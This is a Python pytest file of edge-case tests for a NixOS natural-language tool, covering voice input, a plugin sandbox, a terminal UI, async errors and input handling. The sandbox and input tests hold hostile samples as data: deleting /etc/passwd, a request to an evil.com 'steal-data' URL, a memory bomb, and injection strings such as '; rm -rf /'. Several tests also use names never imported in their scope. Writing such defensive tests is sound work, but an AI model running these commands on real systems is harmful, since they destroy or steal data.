"""
Edge case tests for Nix for Humanity.

Tests unusual inputs, error conditions, and boundary cases.

Since: v1.0.1
"""

import asyncio
import sys
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from luminous_nix import NixForHumanityBackend

class TestVoiceEdgeCases:
    """Test edge cases in voice recognition."""

    def test_voice_without_microphone(self):
        """Test graceful fallback when no audio device available."""
        with patch("luminous_nix.voice.recognition.HAS_SPEECH_RECOGNITION", False):
            from luminous_nix.voice import VoiceInterface

            interface = VoiceInterface()
            assert not interface.recognizer
            # Should fallback to text input

    def test_voice_with_network_error(self):
        """Test voice recognition with network failure."""
        from luminous_nix.voice.recognition import SpeechRecognizer

        recognizer = SpeechRecognizer()

        with patch.object(recognizer, "recognizer") as mock_rec:
            mock_rec.recognize_google.side_effect = Exception("Network error")

            result = recognizer.listen(timeout=0.1)
            assert result is None  # Should handle gracefully

    def test_wake_word_similar_phrases(self):
        """Test wake word detection with similar sounding phrases."""
        from luminous_nix.voice.wake_word import WakeWordDetector

        detector = WakeWordDetector(wake_word="hey nix")

        # Should match these
        assert detector._contains_wake_word("hey nix")
        assert detector._contains_wake_word("hey nicks")  # Similar sound
        assert detector._contains_wake_word("hay nix")  # Homophone

        # Should not match these
        assert not detector._contains_wake_word("hello world")
        assert not detector._contains_wake_word("hey siri")

    def test_voice_with_empty_audio(self):
        """Test voice recognition with silence."""

        recognizer = SpeechRecognizer()

        with patch.object(recognizer, "recognizer") as mock_rec:
            # Simulate UnknownValueError for silence
            mock_rec.recognize_google.side_effect = Exception("UnknownValueError")

            result = recognizer.listen(timeout=0.1)
            assert result is None

class TestPluginSandboxSecurity:
    """Test plugin sandbox prevents malicious operations."""

    def test_plugin_file_system_escape(self):
        """Test that plugins cannot access forbidden paths."""
        from luminous_nix.plugins.sandbox import PluginSandbox

        sandbox = PluginSandbox()

        # Try to access system files
        malicious_code = """
import os
os.remove('/etc/passwd')
"""

        with pytest.raises(SecurityError):
            sandbox.execute(malicious_code)

    def test_plugin_network_access(self):
        """Test that plugins cannot make network requests without permission."""

        sandbox = PluginSandbox(allow_network=False)

        malicious_code = """
import urllib.request
urllib.request.urlopen('http://evil.com/steal-data')
"""

        with pytest.raises(SecurityError):
            sandbox.execute(malicious_code)

    def test_plugin_resource_limits(self):
        """Test that plugins have resource limits."""

        sandbox = PluginSandbox(max_memory_mb=10)

        # Try to allocate too much memory
        memory_bomb = """
data = []
while True:
    data.append('x' * 1024 * 1024)  # 1MB strings
"""

        with pytest.raises(MemoryError):
            sandbox.execute(memory_bomb, timeout=1)

    def test_plugin_import_restrictions(self):
        """Test that plugins cannot import dangerous modules."""

        sandbox = PluginSandbox()

        dangerous_imports = [
            "import subprocess",
            "import os",
            "import sys",
            "__import__('os')",
        ]

        for code in dangerous_imports:
            with pytest.raises(ImportError):
                sandbox.execute(code)

class TestTUIEdgeCases:
    """Test TUI widget interaction edge cases."""

    def test_tui_unicode_handling(self):
        """Test TUI handles Unicode characters properly."""
        from luminous_nix.tui.widgets import CommandInput

        widget = CommandInput()

        # Test various Unicode inputs
        test_strings = [
            "Hello 👋 World",  # Emoji
            "Café résumé",  # Accented characters
            "日本語",  # CJK characters
            "🚀🌟✨",  # Multiple emoji
            "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric
        ]

        for text in test_strings:
            widget.value = text
            assert widget.value == text
            assert len(widget.value) == len(text)

    def test_tui_extreme_input_lengths(self):
        """Test TUI with very long inputs."""

        widget = CommandInput()

        # Very long input
        long_text = "a" * 10000
        widget.value = long_text
        assert len(widget.value) <= widget.max_length  # Should truncate

    def test_tui_rapid_key_presses(self):
        """Test TUI handles rapid keyboard input."""
        from luminous_nix.tui.app import NixHumanityTUI

        app = NixHumanityTUI()

        # Simulate rapid key presses
        keys = ["a", "b", "c", "d", "e"] * 100

        for key in keys:
            app.on_key(key)

        # Should not crash or lose keystrokes
        assert app.running  # App still running

    def test_tui_terminal_resize(self):
        """Test TUI handles terminal resize events."""

        app = NixHumanityTUI()

        # Simulate resize events
        sizes = [(80, 24), (120, 40), (40, 20), (200, 60)]

        for width, height in sizes:
            app.on_resize(width, height)
            assert app.size == (width, height)

class TestAsyncErrorRecovery:
    """Test async error recovery scenarios."""

    @pytest.mark.asyncio
    async def test_async_timeout_handling(self):
        """Test handling of async operation timeouts."""
        from luminous_nix.core.async_executor import AsyncCommandExecutor

        executor = AsyncCommandExecutor()

        # Create a command that will timeout
        async def slow_command():
            await asyncio.sleep(10)
            return "done"

        with pytest.raises(asyncio.TimeoutError):
            await asyncio.wait_for(slow_command(), timeout=0.1)

    @pytest.mark.asyncio
    async def test_async_concurrent_errors(self):
        """Test handling multiple concurrent errors."""

        executor = AsyncCommandExecutor()

        # Create multiple failing commands
        async def failing_command(n):
            await asyncio.sleep(0.1)
            raise ValueError(f"Command {n} failed")

        tasks = [failing_command(i) for i in range(5)]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # All should be exceptions
        assert all(isinstance(r, ValueError) for r in results)

    @pytest.mark.asyncio
    async def test_async_partial_failure(self):
        """Test handling partial failures in batch operations."""

        executor = AsyncCommandExecutor()

        # Mix of successful and failing commands
        async def maybe_fail(n):
            await asyncio.sleep(0.1)
            if n % 2 == 0:
                return f"Success {n}"
            raise ValueError(f"Failed {n}")

        tasks = [maybe_fail(i) for i in range(6)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Should have both successes and failures
        successes = [r for r in results if not isinstance(r, Exception)]
        failures = [r for r in results if isinstance(r, Exception)]

        assert len(successes) == 3
        assert len(failures) == 3

    @pytest.mark.asyncio
    async def test_async_cancellation(self):
        """Test proper cleanup on task cancellation."""

        executor = AsyncCommandExecutor()

        # Create a long-running task
        async def long_task():
            try:
                await asyncio.sleep(10)
            except asyncio.CancelledError:
                # Cleanup code here
                return "Cancelled"
            return "Completed"

        task = asyncio.create_task(long_task())

        # Cancel after short time
        await asyncio.sleep(0.1)
        task.cancel()

        try:
            result = await task
        except asyncio.CancelledError:
            result = "Cancelled"

        assert result == "Cancelled"

class TestBoundaryConditions:
    """Test boundary conditions and limits."""

    def test_empty_inputs(self):
        """Test handling of empty inputs."""
        backend = NixForHumanityBackend()

        # Empty string
        result = backend.execute("")
        assert not result["success"]

        # Whitespace only
        result = backend.execute("   \n\t  ")
        assert not result["success"]

        # None (if accepted)
        with pytest.raises(TypeError):
            backend.execute(None)

    def test_extremely_long_inputs(self):
        """Test handling of extremely long inputs."""
        backend = NixForHumanityBackend()

        # Very long command
        long_command = "install " + " ".join([f"package{i}" for i in range(1000)])

        result = backend.execute(long_command)
        # Should either handle or reject gracefully
        assert "error" in result or "too long" in result.get("output", "").lower()

    def test_special_characters_in_input(self):
        """Test handling of special characters."""
        backend = NixForHumanityBackend()

        special_inputs = [
            "install package; rm -rf /",  # Command injection attempt
            "search `whoami`",  # Backtick injection
            "install $(dangerous)",  # Subshell attempt
            "search ../../../etc/passwd",  # Path traversal
            "install package&background",  # Background process
            "search package|pipe",  # Pipe attempt
        ]

        for input_str in special_inputs:
            result = backend.execute(input_str)
            # Should sanitize or reject dangerous input
            assert result["safe"]  # Our safety check passed

    def test_unicode_normalization(self):
        """Test Unicode normalization issues."""
        backend = NixForHumanityBackend()

        # Different Unicode representations of "café"
        cafe1 = "café"  # é as single character
        cafe2 = "café"  # e + combining acute accent

        result1 = backend.execute(f"search {cafe1}")
        result2 = backend.execute(f"search {cafe2}")

        # Should treat both the same
        assert result1["output"] == result2["output"]

class TestConcurrencyEdgeCases:
    """Test edge cases in concurrent operations."""

    @pytest.mark.asyncio
    async def test_race_condition_in_cache(self):
        """Test cache handles race conditions."""
        from luminous_nix.core.cache import Cache

        cache = Cache()

        # Multiple concurrent writes to same key
        async def write_to_cache(value):
            await asyncio.sleep(0.01)  # Small delay
            cache.set("key", value)
            return cache.get("key")

        tasks = [write_to_cache(i) for i in range(10)]
        results = await asyncio.gather(*tasks)

        # Last write should win
        assert all(
            r == results[-1] for r in results[-5:]
        )  # At least last few should match

    def test_circular_plugin_dependencies(self):
        """Test handling of circular plugin dependencies."""
        from luminous_nix.plugins.manager import PluginManager

        manager = PluginManager()

        # Create circular dependency
        plugin_a = Mock(dependencies=["plugin_b"])
        plugin_b = Mock(dependencies=["plugin_a"])

        with pytest.raises(ValueError, match="Circular dependency"):
            manager.resolve_dependencies({"plugin_a": plugin_a, "plugin_b": plugin_b})

class TestMemoryEdgeCases:
    """Test memory-related edge cases."""

    def test_memory_leak_in_history(self):
        """Test that command history doesn't leak memory."""
        from luminous_nix.core.history import History

        history = History(max_size=100)

        # Add many items
        for i in range(10000):
            history.add(f"command {i}")

        # Should only keep max_size items
        assert len(history) <= 100

    def test_large_package_list_handling(self):
        """Test handling of very large package lists."""
        backend = NixForHumanityBackend()

        # Mock a huge package list
        huge_list = [f"package-{i}" for i in range(100000)]

        with patch.object(backend, "_get_packages", return_value=huge_list):
            result = backend.execute("list all packages")

            # Should paginate or truncate
            assert len(result["output"]) < 1000000  # Reasonable size

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
